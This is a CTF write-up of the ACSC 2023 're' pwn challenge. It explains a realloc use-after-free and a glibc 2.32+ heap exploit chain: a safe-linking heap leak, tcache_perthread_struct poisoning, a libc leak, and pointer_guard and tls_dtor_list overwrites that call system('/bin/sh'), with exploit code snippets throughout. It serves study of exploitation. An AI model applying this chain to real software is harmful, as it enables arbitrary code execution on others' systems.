---
title: "ACSC 2023 re(pwn) writeup"
date: 2023-02-28
draft: false
categories: 
  - writeups
tags:
  - pwn
  - heap
  - tcache struct tampering
  - exit handler tampering
summary: "ACSC 2023 re(pwn) writeup"
# featuredImage: 
---

# [pwn 300] re

> authored by shift-crops
> Sometimes you want to rewrite notes.
> Given files: 

I didn't manage to solve this challenge during contest but I've learnt a lot of new things including recently protection on heap (safe linking) and on pointer (pointer guard), the existence of `tcache_perthread_struct`, `tls_dtor_list`, and some other interesting tricks. I also did some set up to read glibc source code seriously. Therefore, I wanted to write a detail writeup. 

## Understand the binary

Let's take a look at the source code given:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static int getnline(char *buf, int size);
static int getint(void);
static void edit(void);

struct Memo {
  size_t size;
  char* buf;
} mlist[10];

__attribute__((constructor))
static int init(){
  alarm(30);
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  return 0;
}

int main(void){
  for(;;){
    printf("\nMENU\n"
        "1. Edit\n"
        "2. List\n"
        "0. Exit\n"
        "> ");

    switch(getint()){
      case 0:
        goto end;
      case 1:
        edit();
        break;
      case 2:
        for(int i=0; i<sizeof(mlist)/sizeof(struct Memo); i++)
          if(mlist[i].size > 0 && mlist[i].buf)
            printf("[%d] %.*s\n", i, (int)mlist[i].size, mlist[i].buf);
        break;
    }
  }

end:
  puts("Bye.");
  return 0;
}

static void edit(void){
  unsigned idx, size;

  printf("Index: ");
  if((idx = getint()) >= sizeof(mlist)/sizeof(struct Memo)){
    puts("Out of list");
    return;
  }

  printf("Size: ");
  if((size = getint()) > 0x78){
    puts("Too big memo");
    return;
  }

  char *p = realloc(mlist[idx].buf, size);
  if(size > mlist[idx].size)	// size and idx can be 0
    mlist[idx].buf = p;
  mlist[idx].size = size;

  printf("Memo: ");
  getnline(mlist[idx].buf, size);

  puts("Done");
}

static int getnline(char *buf, int size){
  int len;

  if(size <= 0 || (len = read(STDIN_FILENO, buf, size-1)) <= 0)
    return -1;

  if(buf[len-1]=='\n')
    len--;
  buf[len] = '\0';

  return len;
}

static int getint(void){
  char buf[0x10] = {};

  getnline(buf, sizeof(buf));
  return atoi(buf);
}
```

It's a typical note challenge structure. We have an array of 10 notes of size 0-0x78. We can edit or show note's content. `edit()` is more noticable that implemented using `realloc()`, and input `size` can be 0 so we `free()` chunk, but pointer is not cleared after `free()`. So in summary we can use `edit()` to:

- Allocate new chunk for empty note
- Allocate new bigger chunk for smaller note. 
- Edit note's content
- **Free chunk, with pointer remained**

## Leak heap base

We can abuse the above finding to leak heap base by freeing a chunk that another idx point to. 

```python
# leak heap base
edit(0, 0x60, b'a')
edit(0, 0)
edit(1, 0x60, b'a')
edit(0, 0)
list()
```

## Glibc-2.32's Safe Linking

https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/

Note that what we leaked is an encrypted form of chunk's fd:

```c
pwndbg> tel &mlist
00:0000│  0x558f84585040 (mlist) ◂— 0x0
01:0008│  0x558f84585048 (mlist+8) —▸ 0x558f84b632a0 ◂— 0x558f84b63
02:0010│  0x558f84585050 (mlist+16) ◂— 0x60 /* '`' */
03:0018│  0x558f84585058 (mlist+24) —▸ 0x558f84b632a0 ◂— 0x558f84b63
04:0020│  0x558f84585060 (mlist+32) ◂— 0x0
... ↓     3 skipped
```

This is because of glibc-2.32's safe linking.

Safe linking is a security mechanism to protect `malloc()`'s single-linked lists from tampering by attacker.

In this case we encounter this protection when allocate and free tcache chunk

```c
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache_key;

  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  if (__glibc_unlikely (!aligned_OK (e)))
    malloc_printerr ("malloc(): unaligned tcache chunk detected");
  tcache->entries[tc_idx] = REVEAL_PTR (e->next);
  --(tcache->counts[tc_idx]);
  e->key = 0;
  return (void *) e;
}
```

Compare with [glibc-2.31's malloc](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2918), we notice that tcache chunk's fd is encrypted and decrypted with `PROTECT_PTR()` and `REVEAL_PTR()`

```c:malloc.c
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

For example:



Instead of storing `tcache->entries[tc_idx]`, `tcache_put()` store 

```
(&e->next>>12)^(tcache->entries[tc_idx])
```

`&e->next>>12` is basically heap base, and `tcache->entries[tc_idx]` is equal to zero when the bin is empty (the first time a chunk is inserted into that bin).

So the expression is equal to `heap_base>>12`.

## Leak libc base and control tcache_perthread_struct

Now we have heap address.

> My first attempt during ctf is trying to insert a big chunk to unsorted bin and leak libc base. But even when I do the former, it used up 9 slot of notes and I couldn't perform another tcache poisoning to point to the big chunk and leak libc base. 

After reading nyancat's writeup, I notice the existence of `tcache_perthread_struct` which is the first chunk to be allocated on heap. If we could control the tcache struct, we could perform a lot of magic.

First prepare tcache poisoning for 2 bins to allocate at `tcache_perthread_struct`. Note that we overwrite fd with `PROTECT_PTR(tcache_perthead_struct)` instead of the original pointer. 

```python
# tcache poisoning to alloc 2 chunks at tcache_perthead_struct
edit(0, 0x60, p64(0)*2)
edit(0, 0)
edit(0, 0x60, p64(protect(heap_base+0x10)))

edit(2, 0x70, p64(0)*2)
edit(2, 0)
edit(2, 0x70, p64(0)*2)
edit(2, 0)
edit(2, 0x70, p64(protect(heap_base+0x10)))
```

Then write 0x290 bin size to 7, free it to put it to unsorted bin (fastbin's max bin size is 0xa0) and leak libc base. 

```python
edit(3, 0x60, p64(0))
edit(4, 0x60, p64(0) + p64(0x200000000))
edit(5, 0x70, p64(0))
edit(6, 0x70, p16(0)*0x27 + p16(7))
edit(4, 0)
list()
```

## tls_dtor_list

From glibc-2.32, `__malloc_hook` and `__free_hook` were removed so I used `tls_dtor_list ` to prepare a function call when program `exit()`. 

`exit()` is actually a wrapper of `__run_exit_handlers()`. That function will call `__call_tls_dtors()` if `tls_dtor_list ` is not NULL.

```c
__run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
{
  /* First, call the TLS destructors.  */
#ifndef SHARED
  if (&__call_tls_dtors != NULL)
#endif
    if (run_dtors)
      __call_tls_dtors ();
	//[truncated...]
}
```

`tls_dtor_list`'s address can be calculated from libc base. We can prepare the pointer in tcache struct to arbitrarily and point it to a prepared `dtor_list`.

## Pointer mangling

There's one thing to overcome that function pointer in `__call_tls_dtors()` is passed to `PTR_DEMANGLE()` before being called. 

```c
/* Call the destructors.  This is called either when a thread returns from the
   initial function or when the process exits via the exit function.  */
void
__call_tls_dtors (void)
{
  while (tls_dtor_list)
    {
      struct dtor_list *cur = tls_dtor_list;
      dtor_func func = cur->func;
#ifdef PTR_DEMANGLE
      PTR_DEMANGLE (func);
#endif

      tls_dtor_list = tls_dtor_list->next;
      func (cur->obj);

      /* Ensure that the MAP dereference happens before
	 l_tls_dtor_count decrement.  That way, we protect this access from a
	 potential DSO unload in _dl_close_worker, which happens when
	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */
      atomic_fetch_add_release (&cur->map->l_tls_dtor_count, -1);
      free (cur);
    }
}
```



`PTR_MANGLE()` works by XORing the pointer with a 64bit secret thread data (`fs:0x30`), then performing a bitwise left rotation of 0x11 bits (on x86-64). `PTR_DEMANGLE()` is the reverse. 

That secret value is store in Thread Local Storage (namely `pointer_guard`, below `canary`) and its address can be calculated from libc base too. If you can overwrite the pointer guard value to 0, so the mangle will be just ROL(0x11)

Therefore, we control `tcache_perthread_struct` to point entries of 2 sizes to `tls_dtor_list` and `pointer_guard` to bypass `PTR_DEMANGLE()` and point `tls_dtor_list` to a crafted `dtor_list` with function attribute can be `system` or `execve` 

```python
edit(0, 0x78, p16(1)*(0x70//2))     # overwrite tcache->counts
edit(1, 0x78, p64(tls_dtor_list) + p64(pointer_guard) + p64(rol(lib.sym['system'], 0x11, 64)) + p64(binsh))    # overwrite tcache->entries

edit(7, 0x20, p64(0))   # overwrite pointer_guard
edit(8, 0x18, p64(0) + p64(fake_dtor_list))  # point to fake dtor_list 
```

